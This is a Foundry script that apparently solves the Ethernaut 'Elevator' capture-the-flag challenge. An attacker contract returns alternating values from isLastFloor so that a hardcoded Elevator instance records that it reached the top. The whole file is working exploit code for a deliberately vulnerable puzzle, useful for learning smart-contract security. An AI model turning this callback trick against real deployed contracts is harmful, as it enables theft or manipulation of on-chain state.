// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Ex {
    bool public top = true;

    function ex(Elevator elevator_) public {
        elevator_.goTo(1);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        top = !top;
        return top;
    }
}

contract ElevatorSol is Script {
    Elevator public elevator_ = Elevator(0x17DbCEa27Fb68C9A9f329d06fce0fC5F10BEe011);

    function run() external {
        vm.startBroadcast();

        console.log("Before floor: ", elevator_.floor());
        console.log("Before top: ", elevator_.top());

        Ex ex = new Ex();
        ex.ex(elevator_);

        console.log("After floor: ", elevator_.floor());
        console.log("After top: ", elevator_.top());

        vm.stopBroadcast();
    }
}